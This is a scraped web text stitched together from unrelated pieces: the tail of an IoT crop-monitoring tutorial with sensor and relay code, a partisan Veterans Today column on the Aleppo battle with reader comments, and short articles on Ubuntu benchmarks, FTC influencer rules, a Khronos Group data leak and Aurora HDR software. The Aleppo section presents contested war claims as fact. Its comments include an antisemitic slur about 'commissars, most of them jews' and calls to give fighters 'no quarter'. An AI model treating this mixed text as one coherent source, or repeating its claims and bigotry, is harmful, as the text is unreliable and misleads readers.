payload = payload.replace(/(\r\n|\n|\r)/gm,""); //console.log(payload.length) console.log(payload)  In the above code we are creating an event handler by name ‘client.handleMessage’ and whenever there is a data in the channel we are calling the function ‘cb’ because in node js every function can communicate with other function through packet and whenever we receive a message from the mqtt channel we receive it as a packet, packet has two parts topic and payload we are going to take payload and replacing the garbage characters from the data. try{ 
//payload=".9 " 
var state=Number(payload.trim()); 
if(state==1) 
{ 
relay.write(1); 
setTimeout(null,5000); 
relay.write(0); 
} else 
{ 
} 
}catch(ex) 
{ 
console.log(ex.message); 
} cb() 
} In the above code we are converting the payload string into the number and calling the trim method to remove the \0 from the command received by the mqtt protocol, so that there will not be any garbage characters remain in the command and checking if data is 1 we are going to keep the relay ‘ON’ after 5 seconds the relay will be closed automatically.  4.

console.log("temparature="+temperature);  In the above code snippet Loop() is a function which is called to read the data from the sensors, and we are taking the data from the sensor which is in the form of seed studio temperature value and converting that in degree centigrade by using the formula shown above.   var lightVal=ldrSensor.read(); 
var lp=lightVal*100/1024; 
lp=Math.floor(lp * 100) / 100; 
console.log("Light %"+lp);  In the above code we are reading the data from the ldr sensor and converting that in the form of a percentage of the light intensity by using the formula1 above and the calculated percentage can have a huge decimal number that we cannot display onto the lcd so, to restrict the number to two places of decimal we are using formula2 above. var soilVal=1023-soilSensor.read(); 
soilVal=soilVal*100/1023; 
soilVal=Math.floor(soilVal * 100) / 100; 
console.log("Moisture="+soilVal+"%"); In the code above we are reading the value from the soil sensor which is actually inverse to the moisture of the soil so in order to calculate moisture we are subtracting it from the maximum soil value, and calculating the percentage of the moisture using formulae and displaying it as a 2 digit decimal number.    var rainfall=1023-rainSensor.read(); 
rainfall=rainfall*100/1023; 
rainfall=Math.floor(rainfall * 100) / 100; 
console.log("Rainfall="+rainfall+"%");   Here in the same way as explained for the soil sensor for moisture calculation we are reading the data from the rainfall sensor and calculating the percentage of the rainfall and displaying it onto LCD. myLCD.clear(); Clear the lcd by removing past data. myLCD.setColor(255,0,0); Setting a red color for LCD display because it has RGB color to display. myLCD.setCursor(0,0); Setting cursor at the 0th line and 0th character. myLCD.write(""+temperature);

myLCD.write("'C"); Displaying the temperature from 0th line to the 5th character with  ‘C included on lcd.    myLCD.setCursor(0,8);
 myLCD.write("L="+lp); Displaying light percentage in the 0th line from 8th character after temperature value.   myLCD.setCursor(1,0); 
myLCD.write("R="+rainfall+"%"); 
myLCD.setCursor(1,9); 
myLCD.write("M="+soilVal+"%"); 
console.log("\n----------------------\n");   Displaying rainfall and the moisture value on lcd, in the 1st line from 0th character rainfall rate is displayed an in the same line from the 9th character moisture value in the form of percentage will be displayed.   5.

However, more advanced Matlab toolbnoxes are not yet being supported by ThingSpeak.  So, we run a local script to first fetch the values from our ThingSpeak channel and then performing a predictive and cluster analysis. We assume a very simple formula for the prediction. The predicted value = Previous Value + Standard deviation of the past.  Though this is not the most elegant ways of predicting a series, and we must always go with more roboust methods like feedback kalman filter, the implementation exposes the strategy of predictive analysis. You can always built your own algorithm on the top of it. We use K-Means clustering separately on all the four parameters to obtain the most prominant trends in the data. we use a ThingSpeak Matlab toolbox called ThingSpeakFetch We perform thre primary analysis on the data:  Predictive analysis  Cluster Analysis Statistical Analysis clear all;

end Fig Matlab Analysis of ThingSpeak channel Matlab command prompt shows the statistical values ( mean and standard deviation ) of temperature data, You can't see much difference between actual and predicted series because predicted series follows the actual series. The cluster analysis divides the points into lower and higher values which are represented by blue + and red *. Based on this, one can take decisions about aggregated environmental status and can set his threshold for watering accordingly. This can even lead to better requirement analysis for pesticides and fertilizers. Conclusion Improvement of the crop productivity is a major challenge in the countries like India,the technological improvement is an mandatory work to improve the crop productivity to support and sustain the need for ever green population of our country.In the past several sensor driven network have been proposed to successfully monitor the large agriculture field. However most of the technology doesnot offer on the data mining technique and predictive analysis,which limits the data usage o accurate state of the field and crop.We propose a novel technology by means of which gathered data from physical sensing devices is mitigated in the cloud,where a machine learning technique could in real time produce not only the alerts corresponding to the current state of the environment and the crop but at the same time can offer predictive analysis of the future state of environment as well as crops. The IoT based architecture also offers real time realization and analysis of data which can be used across the globe in conjuction with the parameter been monitored through other parts of the world to understand the abnormal behavior of the similar kind of the crop.Our result shows that the proposed system has a very optimal latency for controlling the system as well as high packet delivery rates and accuracy for mitigating the data.The system can further been improved by incorporating new self learning techniques which could  be deployed in the cloud to understand the behavior of the sensing data and can take autonomous decisions.

View Latest Posts >>> NEO – Don’t Cry For Me in Aleppo By Jim W. Dean, Managing Editor on August 6, 2016 by Jim W. Dean, VT Editor  … with New Eastern Outlook, Moscow “Just societies cannot be run by big money or armed forces with their too narrow agendas.” ~ Plato The Western-supported rebels have rained their “barrel bombs” down on the Aleppo civilians [ Note: The media fraud on the Syrian War is reaching hysterical levels as the Aleppo and Manjbi battles are turning against the rebels. When there is nothing good to report, we see the terrorist supporters dragging out the age-old Damascus “barrel bomb” stories and the predictable “gas attack”. The Russians held their media response fire until they could review all of their Intel on the gas attack, and then confirmed it had come from a US-rebel supported area. That is why I used the gas canister images. If you google that phrase with Aleppo, you will come up with a mass of photos, as the jihadis love showing themselves using this indiscriminate weapon on government-held areas. The rebel “barrel bombs” have literally been raining down on government-held areas with almost zero coverage in the Western press because it did not fit the narrative they were trying to imprint upon us. Corporate media pushing the rebels and jihadis as the good guys is one of the biggest media frauds in history, including no real denunciation from any of the media trade groups. Rebel “mobile artillery” We see this over and over, where from the big veteran to religious denominations, our big civic organizations have stood down, while watching this ongoing fraud like it was none of their business. As for the news unions, they have just been pitiful. All they had to do was have monthly, one-day work stoppages, with demands for “content investigations” to spotlight compromising of major media at the highest levels, and the public would have rallied around them. It is safe to conclude that no one had the stomach for it, including the retired senior people who could have more safely taken the leadership roles. Even at VT, despite the quiet “keep up the good work” atta-boys we get from many individuals inside the matrix, the institutional support has been zero. They are too scared to even talk to us, afraid they would end up on a list. This is how low American leadership has sunk. When the public sees so many others “faking it”, with no career blowback consequences, then resistance is viewed as a sucker’s game. But we would never swap places with them, despite all the good-life, side benefits on the table for the sellouts… JD ] ____________ US coalition approved terror shelling – First published  …  August 06,  2016 – The battle for Aleppo does not look it will end well for the rebels and jihadis who have held the city for four years, living off the looting of the houses and businesses of Damascus supporters who long ago fled the city with just a car and a few suitcases.  What will remain of Aleppo when it is over? I met one of these émigrés during the Damascus Counter Terrorism Conference in December of 2015. She was one of the Veterans Today team’s guides and interpreters. Her manufacturing family had fourteen diversified, medium-sized businesses in Aleppo before the war, but lost them all, with the equipment and inventory loaded onto trucks and taken to Turkey to enrich the army of parasites that have fed off the Syrian War. I don’t call the Syrian struggle a civil war, as that would give cover for the international geopolitical hoodlums who used Syria as an example of what could happen to those would not submit to their domination. As with most all the “color revolutions”, they used local assets as the cannon fodder, but the upheaval was foreign-inspired, while trained and supported by various countries and business interests seeking to profit from a future Balkanized Syria. The Syrian Army and its allies have finally surrounded the rebel and jihadi forces in their Eastern Aleppo stronghold and brought that battle to what may be its final resolution. An extra bonus in following the news coverage has been seeing how the international anti-Syrian media has launched its own final battle to smear Damascus and the Syrian Army for doing what an elected government and loyal army is supposed to do… defend the country. The VT team (middle four) at the Damascus Counter-Terrorism Conference on Dec. 6, 2014 In Syria’s case the fight has not only been with traditional opposition rebels, but also Western and NATO countries teamed up with Saudi Arabia, Qatar and Turkey to carve Syria into spheres of influence, in a classic throwback to the old colonial days. When that did not work, the Western and Gulf State Intel agencies unleashed a large-scale terror war against the Syrian people to help tip the scales in their favor − and it almost worked. But the above-mentioned scoundrels had another institutional helper in their dirty deed. Western media became the Syria-busters’ PR weapon to keep the Assad regime and its supporters under constant assault. Running a multi-year proxy terrorist regime change operation required a steady smokescreen operation, and I have had a front row seat watching it reach its peak during the current Aleppo battle. Over the past ten days, I was able to do a number of TV interviews, including two Debate Show features with Press TV, with opponents who were anti-Assad regime boosters. The first was a professor from John Hopkins University in Washington, Daniel Serwer, where the topic was Battle for Aleppo. The second Debate Show a few days later was on Assad’s amnesty offer for the Aleppo rebels. Jim Dean and Prof. Serwer go head to head Both of these guys were walking propaganda delivery boys using the same talking points that most of the anti-Assad faction had had emailed to them by their minders. Prof. Serwer seemed to have been assigned to caste Assad as being responsible for the 400,000 deaths from the Syrian War, barrel bombing, and of course all the hospitals he claims were blown up on purpose. He even claimed that the Russia air wing was also responsible for some of these, a black lie because Russian Air Command caught the French Doctors without Borders putting out a bogus story of like eight or nine of them bombed over a few days, but where research later showed that most of the towns mentioned did not even have hospitals. Briefing and Q&A by the governor of Homs province, Talal al-Barazi with election monitors, June 03, 2014 (Photo credit: Jim W. Dean Archives) Prof. Serwer would not acknowledge that Aleppo was being liberated, but was “a conquest by an autocracy”. This outrageous statement ignored two elections, where Assad was reelected by a huge majority. One election I attended as an election monitor in 2014 in the city of Homs, where I visited five polling stations where we had free rein to interview whomever we wanted, which included the governor, Tala Barazi. The event was as much a celebration for Assad and the Army keeping the country from being taken over by the Western and Gulf State-backed jihadi terrorists as it was a political event. My second Debate show opponent was a Michael Lane, who was supposed to be the founder of a think tank-sounding entity called the American Institute for Foreign Policy, founded in 2004. A quick Google of both came up with absolutely nothing on the Institute, and nothing on Lane, other than his Press TV shows. He had the profile of a planted talking head, where his public background had been cleaned off the internet. And talk he did, about how Assad’s amnesty offer could not be trusted, describing it as an “unverified offer”. I countered with the long record we already have on numerous Assad amnesties which have worked just fine, where many of the takers were incorporated into the civil defense units. Lane was also selling how humanitarian effort could easily have succeeded if the Syrian Army had stepped back and allowed the UN to handle it all. I again countered that the UN could not do that in the middle of a big battle without the Syrian Army having to be tied up providing it with security from car, truck and suicide bombers to block the rebels’ human shields from getting out of the city. The mysterious Michael Lane (R) and his think tank that does not show up on Google We also have the track record that during the initial ceasefire, the West, Turkey and Saudi Arabia poured in more reinforcements, ammo and new weapons, like the TOWS and MANPADS, which were then used to support counter attacks all over Syria. Corporate media has also shown its true colors on Aleppo coverage. The Guardian actually had an editorial whose purpose seemed to be an effort to save the surrounded rebels and jihadis by pressuring Syria to stop the battle. The UN could pump in all the food and supplies for the civilians, while the rebels could get resupplied by their various sponsors to later launch more counter attacks. The strategy is to continue undermining Assad via endless war, regardless of how many lives are destroyed. The Guardian pulled out all the stops to paint the worst picture possible: “It would not just be a defeat for the rebels, perhaps an irreversible defeat for the uprising – it would be the beginning of a new, humanitarian catastrophe of unprecedented proportions in Syria…International pressure must be put on Russia to force Syrian troops to retreat, so that lives can be saved…Its machine of repression makes no distinction whatsoever between armed combatants and civilians.” British media has been “in the bag” for a long time The Guardian editors appear to have gotten an assignment from British Intelligence to try to put lipstick on a pig. I had predicted during one of my Debate Shows that the Aleppo jihadis would attack the humanitarian corridors to scare their human shield civilians from taking that path, and within a day they were doing car bomb attacks and shelling the corridors. The rebels have been counter attacking Syrian lines in an effort to open up their own supply corridors. It is they who have refused to join the peace process via a political solution, as they bet that their backers would continue to keep them in the fight during the phone ceasefire. Turkey’s coup may have been the tipping point for a change in Erdogan wanting to concentrate all of his resources on the home front and ease out of the Syrian conflict. His main war aim now seems to be in taking on the international Gulen organization and its main sponsor, the U.S. But Erdogan seems unpredictable now, with his attempt to blackmail the EU with his demand for a visa regime by October or he would reopen the refuge floodgates. This is hardly a predictable situation by any means, especially when we see Russia-Turkey relations being normalized, something that began before the coup; and some say this may have had an effect on its timing, as Erdogan has now openly charged the CIA and FBI with supporting the coup. The rebels shooting down a Russian relief helicopter returning to base might have put a wooden stake through their hearts. They will now be met with cold resolve. Assad and the Russians know that the rebels and Jihadis have nothing to fight for when they have lost Aleppo, and their backers will abandon them. Gone will be the Saudis’ dream of an energy pipeline to the Mediterranean and onward to Europe. Gone will be the dream of an autonomous rebel region that might want to someday host US military bases or even NATO in Damascus’ rear and block Iranian-Russian flights through Iraq. The Russian cruise missile strikes from the Caspian Sea launches have not been forgotten, neither the importance of having friendly and safe ground to fly over when projecting military power. That is why the US coalition wants to keep its rebel forces in control of Aleppo. Jim W.

If Syria had nuclear armed cruise missiles that could hit Ankara, Riyadh, and Tel Aviv, would this war have happened? If the answer is no, that seems to be a way to start of a nuclear arms race with only losers in the long run. A related question is, what price beyond money already spent will the US/NATO, Saudi, Turkey, and Israel pay for doing this to Syria? If the answer is nothing, no war crimes trials for leaders, and not even paying for rebuilding Syria, there is no incentive for them to not repeat this action in other countries again and again. Log in to Reply Cold Wind  August 6, 2016 at 2:20 pm I make no bones about it. I’m rooting for Assad and the Syrian Army and I hope they crush the “rebels” in Aleppo real soon. It’ll be a good day for me when it happens. My mood will only have been tempered by all the destruction, pain and suffering the “rebels” inflicted on Syrians and for (truth be told) Israel’s sake. Isn’t Israel the reason why the US is in Syria at all? Yep, it’ll be a great day to see the “rebels” wiped out. I say give them no quater! Wipe them out! Log in to Reply Edward Longshanks  August 6, 2016 at 2:26 pm No, greater Israel is a virtuell enterprise. The war in Syria is based on a pipeline from Qatar to the Mediterrean and to destroy the secularized regimes in the Orient and North-Africa, to support the US$ and to get an argument for permanent war. Edward Longshanks  August 6, 2016 at 11:07 am I have to confirm that the Spiegel yesterday’s and today’s reports about Aleppo are miserable as never before. By failure today’s report mentioned the first time in an accessory sentence the support of ISIS via Turkish routes. Such a mistake in German Bolshewik controlled media shows the effect of losing ground by the US in the Levante. German Massmedia still states that the gas is used by Assad, in spite of the fact that US officials already corrected this blame. Log in to Reply Jim W. Dean, Managing Editor  August 6, 2016 at 11:17 am Our German readers tell us that German media is more in the bag than in the US…that like Britain the Intel people have a lock on anything they want a lock on, or it is “publish at your own risk time”, and everyone knows what that means there. Edward Longshanks  August 6, 2016 at 12:16 pm No doubts on that. Two small points to add. The system Germans tend to a typical German kind of character, the preemptive obedience. At second, different from the US, in Europe a regime change means the same, as in Turkey and Poland now. The politicians fear to lose their well paid jobs, so they panic and fail in political polarization. Ramirez  August 6, 2016 at 10:09 am Jim I had the misfortune of catching a C4 news report where they sent a camera crew into Aleppo with two Syrian(?) doctors. They were in a car with them and at one point they stopped driving as they were supposedly in a place where the SAA were dropping barrel bombs. You heard a noise that did not sound explosive and the reporter said ” Oh that was just a small barrel bomb” Then they basically arrived at work. Log in to Reply joetv  August 6, 2016 at 9:47 am Why does it bother me when ISIS, Al queda, and others are identified as the rebels? The term “rebel” lends legitimacy to them. Is this an actual revolt of Syrian citizens? A more accurate description of Syrian opposition is Criminals, or International Theives. Either term would be more accurate. Can I define a burglar as a “moderate trespasser”? What can we call a murderer? How about “interrupter”. “Mr. Smith’s life was interrupted last night when…” Not so bad right? Much more relaxing.

It is reaching epic propotions. I fear this fight is so important to the West that they will do anything, including WW3 to win. Like Israel with their Sampson option platform of, if we go down everyone does. For the West this is truly too big to fail. The truth has been obfuscated to the point where the average Joe doesn’t trust any media. Our senses are battered. We are almost senseless. How else to explain mass apathy. I have chosen firms like VT to get the facts. I think I’m right. Mr. Dean don’t ever waiver. “Who Let The Dogs Out”? Log in to Reply NotAVeteran2  August 6, 2016 at 8:55 am Is ‘war’ really picking up some kind of (semi) automatic machine gun, Step around the corner, fire your gun aimlessly in the street, to be taken out by a headshot? Is ‘war’ really taking cover behind your squad member with the RPG, Just in time to get your head blown off by the blow back? (or whatever you call it) Is ‘war’ really loading up a little van with thin metal plating, then drive straight up to a small convoy to be outnumbered 3:1, just to be dead, with a mout full of sand 20 minutes later? Log in to Reply NotAVeteran2  August 6, 2016 at 8:57 am I know nothing of war. But I do know that if I would find myself in one, this would not be the way I would fight it. I kind of like living. So after seeing footage such as I mentioned, I can only conclude… I’m not sure what is going on there, but a war it is not. NotAVeteran2  August 6, 2016 at 10:49 am Yes as in, “It happens”. No as in “F-ing stupid thing to do” Right? Other things that bother me after watching videos of private contractors and things like: v=WYJ_O1rCRU8 So, you are stuck on a roof or in a ditch in a sand colored world. There’s a lot of shots being fired, in a “general direction” sort of way. You can not see where you are shooting or who is shooting you. Then you decide to take a peak using: A black gun, black binoculars, a black cap, a black vest. I guess those things can not be made in sand color? Or maybe surviving the thing is not a top prio? NotAVeteran2  August 6, 2016 at 8:54 am First, I know nothing of war. I, nor my father, have ever been in a war, yet: Whenever I see footage on the fighting in Syria, I think by myself: “Is that really how you fight a war?” Is ‘war’ really a lot of standing around in groups, waiting to load up a barrel and then shoot it off in some indiscriminate direction? Log in to Reply NotAVeteran2  August 6, 2016 at 9:31 am I am hoping for the same, though I am not sure that living in the cradle of the ‘Builderburg Meetings’ is any sort of help. When WW3 hits, I might survive the initial onslaught, but any blowback might turn this 270*150 KM piece of land (and me included) into dust. Well, no more worries then at least. Edward Longshanks  August 6, 2016 at 11:35 am I know nothing of war, too. But i asked. One of my grandfathers was with 17 years in Belgium hanging on a ballon to steer the German artillery, he was often attacked by Bristish double-decker warplanes. He had to see all those casualities in modern warfare, he never could get over it. In WW2, above 40 years, he served as a guard on different places. My other Grandfather served as a ambulanceman in Russia for a company, which chased partisans behind the front till 1942, with his 5th child born, he served at home as a police officer, it happend on a Führerbefehl. The Russian people, in occupied Russian territory by the Germans, feared more the Bolshewik commissars, most of them jews, than the SS. The Germans, concerned to symetric warfare, were not really successful against the partisans. Later on they used russian entities like the Vlassov army against the partisans. These guys simply annihilated villages and towns, whith those measures they stopped partisan warfare. But today nobody is going for symetric warfare anymore, because the enemy is always the US army in joystick combat. What VT and southfront publish are pictures of asymetric warfare. I owwn an private interview with a German panzerman, bearer of the Knight’s Cross of the Iron Cross, in German, i could provide it for you via VT, if you want it. He describes his involvement in the battles in France, Africa, Yugoslavia, Russia and Berlin. Codoh  August 6, 2016 at 8:50 am Sadly the situation doesnt look good on the ground. After Castello fell to the Syrian army, the terror zombies took over south Aleppo and are close to opening up a supply line there. Basically they traded supply routes…And apparently they lost hundreds of in that offensive. Either way….the fight for Aleppo is far from over…lets hope for the best here…Russians should fire their toys now when the situation demands it, not on some remote Zombie warehouse thats not exactly important… Log in to Reply Jim W. Dean, Managing Editor  August 6, 2016 at 11:12 am “the fight for Aleppo is far from over”.. Amen on that. Let us hope that the Syrian and Russian command has anticipate this strategy of the rebel counter attacks and is geared up to concentrate firepower to destroy them when they concentrate for their attacks. This is also combat taking place outside of the city so they can use air power and artillery, which with drones as spotters they should be able to deal with “fluid” situations, the toughest fight to use artillery in.

Add A Comment Being mid-way through Ubuntu 16.10's development cycle, here are some fresh benchmarks showing how its performance has changed (if at all) compared to Ubuntu 16.04 LTS as well as compared to Intel's high-performance Clear Linux distribution as a reference point. Over Ubuntu 16.04, the current Ubuntu 16.10 images have GCC 6.1.1 as a big difference for the tests being built from source. Right now Ubuntu 16.10 is still relying upon a Linux 4.4 based kernel while Linux 4.8 will end up being used by the Yakkety Yak in October. Ubuntu 16.10 also has Mesa 12.0.1, but no graphics tests were done for this article since the card running in this system was the GTX 770 with less than ideal Nouveau driver performance. Intel's CLear Linux meanwhile has the Linux 4.7 kernel, GCC 6.1, and LLVM Clang 3.8.1. A larger Linux/BSD comparison on this same system is currently being worked on. Clear Linux continues leading over Ubuntu in many benchmarks. Part of the reason is Clear Linux ships with many optimized compiler flags by default compared to Ubuntu and many other distributions. GCC 6 seems to help some tests over GCC 5 on Ubuntu 16.04. There are a few upsets. In some tests there isn't much of a performance difference. See more of these benchmark results via this OpenBenchmarking.org result file while staying tuned for a larger Linux/BSD comparison on this system.

Photographer: Shareif Ziyadat/WireImage via Getty Images Snapchat star DJ Khaled raves about Ciroc vodka. Fashion lifestyle blogger Cara Loren Van Brocklin posts a selfie with PCA Skin sunscreen. Internet personality iJustine posts Instagrams from an Intel event. Missing from their messages: any indication about whether they’ve been paid. This uptick in celebrities peddling brand messages on their personal accounts, light on explicit disclosure, has not gone unnoticed by the U.S. government. The Federal Trade Commission is planning to get tougher: Users need to be clear when they're getting paid to promote something, and hashtags like #ad, #sp, #sponsored --common forms of identification-- are not always enough. The agency will be putting the onus on the advertisers to make sure they comply, according to Michael Ostheimer, a deputy in the FTC’s Ad Practices Division. It's a move that could make the posts seem less authentic, reducing their impact.  “We’ve been interested in deceptive endorsements for decades and this is a new way in which they are appearing,” he said. “We believe consumers put stock in endorsements and we want to make sure they are not being deceived.” This means more cases like the one against Warner Bros. Home Entertainment Inc., which last month settled with the FTC over charges that it deceived customers by paying internet influencers such as PewDiePie – who has about 50 million followers on YouTube -- to promote the video game Middle-Earth: Shadow of Mordor with positive reviews, without disclosing that they were paid and told how to promote it. In March, the FTC issued a complaint against Lord & Taylor for paying fashion influencers to create posts about one of its dresses on Instagram, without disclosing that the retailer paid them and gave them the dresses for free. Any compensation, including free products, should be disclosed, the FTC says. Companies have been pouring marketing dollars into social media endorsements, paying everyone from a Hollywood celebrity to a mom who regularly Instagrams her baby snuggling with a puppy. Reaching consumers, especially 20-somethings, is increasingly difficult because of television’s waning marketing power. Social media is where those dollars are headed with brands already spending more than $255 million on influencer marketing every month just on Instagram, according to Captiv8, a company that connects influencers with brands. Personal endorsements are as old as advertising itself, and there’s always been abuse. So when the FTC highlights influencer marketing as having a disclosure problem, it can come across as unfair, said Stefania Pomponi, the founder of Clever Girls Collective Inc., a marketing agency that works with brands including Disney and Ford. "We're venturing into a little bit of ridiculous territory with the FTC saying these things because influencers really want to follow the rules," Pomponi said. "They want to do a good job --  they want to be seen as useful to brands and don't want to do anything that would jeopardize their relationships.'' It's up to the FTC to be more clear and consistent about their policies and enforcement, she said. A lot of influencers think they are following the rules, but in fact are falling short. More than 300,000 sponsored posts on Instagram in July used hashtags like #ad, #sponsored and #sp, up from about 120,000 a year earlier, according to Captiv8. The FTC thinks #ad is okay if it's at the beginning of a post, but #sp and #spon aren't.    “If consumers don’t read the words, then there is no effective disclosure,” Ostheimer said. “If you have seven other hashtags at the end of a tweet and it’s mixed up with all these other things, it’s easy for consumers to skip over that. The real test is, did consumers read it and comprehend it?” A photo posted by Justine Ezarik / iJustine (@ijustine) on Nov 1, 2014 at 12:37pm PDT   Hashtags like #sp and #spon may not be fully understood, especially if they’re buried at the bottom of a post, he said. And any disclosure would be better at the beginning. When it comes to video, the FTC calls for disclosure to be said out loud or displayed on screen. It can get even more complicated on Snapchat, where there's not an obvious place to put a hashtag, and the videos are only a few seconds.  Some advertisers say influencer posts don’t deserve such careful disclosure, because they are not the same thing as a traditional ad. Lauren Diamond Kushner, a partner at Kettle, a creative agency in New York, has worked on influencer campaigns with brands including Sunglass Hut. She said the Instagram stars and YouTubers often only work with the brands that they genuinely like and use. “I don’t know if I even think of it as an ad,” Kushner said in an interview earlier this year. “They say, ‘I’ll do this piece and I’m going to do it my way.’ Whereas if I’m scrolling in my Facebook feed and I see a big thing from H&M or whatever, that is an ad.” She likened influencer content to product placement -- a basketball team wearing jerseys by Nike, for example. The FTC disagrees. A character on a sitcom drinking a Diet Pepsi isn’t giving their personal opinion about the soda, and the actor is playing a character. The agency says the basic test is: If a consumer knew an endorser was compensated in any way, would that alter the view of the endorsement? In the overwhelming majority of cases, the FTC says yes. Nicola Foti, who makes comedy sketch videos and has about 388,000 followers on YouTube, said brand deals are how he makes the bulk of his income. But he said he’ll only do them “as long as it’s something that I like or something that supports a product I like.” “My audience is usually pretty receptive to anything I talk about brandwise because they trust that I’m not just selling them something I don’t care about,” he said.  One way of disclosing: tagging a brand and thanking them. “NEW VIDEO! SEX TOY UNBOXING thanks to @adamandeve!" read a recent tweet by Foti. The tweet doesn't hint at a brand deal, but the video, which has 25,000 views, displays "sponsored" on the screen within the first 30 seconds. Nick Cicero, the CEO of influencer marketing agency Delmondo, said the FTC has already changed some practices in the industry by bringing recent lawsuits. “For a lot of years it was really really loose, and you could get away with a lot more,” he said. Now he’s telling all of his clients to use the hashtag #ad. The FTC has been getting the word out with online webinars and guides, speeches and engaging trade associations. “We’re not calling up each individual ad agency,” Ostheimer said. It will also continue to go after the advertisers with legal action. While it hasn’t charged an influencer for deceptive advertising, it hasn’t ruled that out. “We hope by bringing these cases that we not only stop the marketer and influencer who didn’t have adequate disclosures previously, but also get the message out that other companies should have clear and conspicuous disclosures,” he said.

The data comes from the website of Khronos Group, a non-profit focused on the creation of open standard APIs for the playback of media files on various platforms and devices. The group manages Open Graphics Library (OpenGL), which is used by developers in everything from computer-aided design to video games. “Khronos Membership puts your company at the forefront of the development of these APIs, and lets you collaborate with over 100 industry-leading member companies across the globe,” the website reads. Motherboard was provided a SQL file of just under 3,000 accounts for the site. The data includes usernames, email addresses, plaintext passwords, sign up IP addresses and dates, and in some cases physical addresses. The data includes accounts for Google, Intel, Apple, EA, Panasonic, VMWare, IBM, Toshiba, Samsung, and Sony Ericsson employees, as well as many other companies. Motherboard understands that the data has likely been kept private among a group of hackers. Eighteen out of 20 email addresses and usernames tested by Motherboard corresponded to accounts on the site. (This was done by attempting to create new accounts with them; if the email address or username was already in use, it was not possible to complete this process). Three people in the dump, including a very prominent security researcher, confirmed to Motherboard that details such as their password or signup date and IP address appeared to be accurate. It is not clear whether the hackers took the full database for the Khronos Group website, or only these 2,955 select accounts. (Each record is given a numerical “number ID,” and some entries in the data stretch to an ID just under 7,000). Motherboard provided Khronos Group with a copy of the data after the organisation responded to an initial email, but the group has not provided comment despite multiple follow-up emails. One of the victims reached by Motherboard said that he generates passwords, likely creating unique ones for each site with a password manager. This means that whoever hacked this data couldn't then use the password in the dump to access other accounts. This was just one case, however: many of the other passwords very weak or predictable. The lesson: If any of these tech employees used the same password on the Khronos Group website as on another service, then whoever managed to get hold of this data may have access other accounts. Of course, that also depends on whether two-factor-authentication has been enabled. Regardless, don’t reuse passwords. Another day, another hack.

It has a variety of great programs available, and we have featured Macphun Noiseless and Macphun Tonality in the past. As the name suggests, it’s Mac-only software. At least for now, there’s no PC support. Recently, Macphun teamed up with Trey Ratcliff, one of the most famous HDR photographers in the world, to produce a plug-in and standalone piece of software specifically for creating HDR images. Ratcliff’s social media following is quite phenomenal. He has over 8.5 million followers on Google+, where, at the time of writing, his images have been viewed 123,754,457,940 times. He’s passionate about HDR and he knows his stuff, so if there were one person you’d want to help design your software it would be Ratcliff. What it does If you want to ad HDR punch to your images, Aurora HDR Pro can provide it There are two options for Aurora HDR. The standard version costs £29.99 and is available only from the Apple App Store for Mac OS. This version limits users to JPEG, TIFF and PNG (not raw files), and has many of its features cut back. The second option is the Aurora HDR Pro. It boasts all the functionality you could wish for and a lot of presets. It also allows users to use Aurora HDR as a plug-in for Adobe Lightroom, Adobe Photoshop and Apple Aperture, as well as being a  piece of standalone software. Aurora HDR Professional allows users to create HDR and tonemapped images with a single shot or multiple bracketed images. It can read PNG, 8-bit and 16-bit TIFF, GIF, PSD and raw files. As the software is rather new, it supports the vast majority of raw files currently in use. Aurora HDR Professional also features a comprehensive toolset that allows users to make a variety of different image adjustments, as well as the HDR merging. Starting out The first screen is where you load your images. You can select to load a single image or a series of bracketed images. Once selected, you are given the option of alignment, ghost reduction and chromatic aberration reduction. Chromatic aberrations are commonplace when the brighter exposure of a bracketed shot is merged, so it’s a handy feature to have. Also, when ghost reduction is selected, you are given an amount you can reduce the ghosting by on four different strength settings, as well as the option to select a reference image for more accurate merging. Once an image, or series of images, is loaded and processed, you can start working on the file. The layout is very similar to Adobe Lightroom, and it works much the same, but this software is HDR-specific. Tool run-down Down the right-hand side is a selection of tools. The first of these is Tone, a toolset for basic adjustments, including highlights, shadows, midtones and blacks/whites. Next is Structure, which allows users to control the strength of the high-contrast HDR look and the clarity. It’s easy to overdo it in this panel, so it’s worth tweaking this part the most. When you lighten shadows extensively you can introduce a lot of unwanted noise, so Macphun has provided a denoise tab that allows users to control the intensity of denoising and smooth out areas. Aurora HDR can be used for more subtle adjustments to enhance your images without going too far over the top The Image Radiance tab lets users give their image highlights a more radiant, glowing look, but it also includes a colourising portion inside the tab for users to change the warmth and colourise the light end of the midtones, through to the highlight portion of the image. Below this is a colour tab for saturation, vibrance and colour temperature changes. The Details tab allows users to sharpen either small, medium or large areas of detail, and each can be controlled individually, localised to either highlights, shadows or globally. Glow tab is much like image radiance, doing what it describes and making the images glow. Below this is a tab called Top & Bottom Lighting, which I found very useful. It allows users to control the exposure from the top half of the image and make it lighter or darker. The same can also be applied to the bottom  half. This is especially useful for balancing landscape images. The Tone Curve tab is simply a curves adjustment, while the Color Filter tab allows users to control the saturation and luminance of different colour channels. Colour Toning tab is a bit like Lightroom split-toning. It’s intended for users to tone the highlights and shadow areas. At the top of the tab are some handy presets to try out. Below is Vignetting, which lets you put a vignette on or tame an existing vignette, while at the bottom is Layers. This tab allows users to blend all their edits with the original HDR merge, and vary the strength of their adjustments. It can also be used when creating other layers. Images with a lot of dynamic range can be pushed quite extensively There are a couple of useful tools along the top bar of Aurora HDR Pro. One compares images before and after changes. It can be set up to split the screen or view the versions side by side. There are zoom tools for checking specific areas of an image, a move tool for moving the enlarged images around, a rotation tool for rotating the image, a crop tool, a full-colour histogram, two buttons for importing and exporting images, and a masking brush and layers. Creating a new layer is a lot like creating an adjustment layer in Adobe Photoshop. Users make their adjustments as mentioned previously and then, using the masking tool, paint in where they want their adjustment to be applied. The brush can be refined and is controllable. Confusingly, there’s a graduated filter simulator inside the brush menu, too, but it is very useful in allowing users to quickly make an adjustment mask to a graduated part of the image. It can be tilted, rotated and feathered, allowing foreground and skies to be darkened or lightened. Also, in the layers there is the option to use blending modes such as Soft Light, Hard Light and Color, to name a few. These allow users to blend effects and make more dramatic images. HDR presets Along the bottom of Aurora HDR Professional is a variety of presets that can be selected by category. Categories include ones for landscapes and architecture, as well as Trey Ratcliff’s own preset collection. Users can also save their own presets. Many of the presets are quite strong, giving a heavily processed look, and for many shots they’re dependent on a specific type of scene such as a cityscape with bright highlights. Often, many images don’t work with a lot of presets, but there will usually be one or two that do work well. In use Any users who are familiar with Adobe Lightroom will feel right a home with Aurora HDR Pro, as there are presets, plus an editing panel that’s located on the right hand side. It also boasts some of the same slider-style editing as Lightroom, with similar native adjustments available, too I tried using a variety of images with the Aurora HDR Professional, including ones 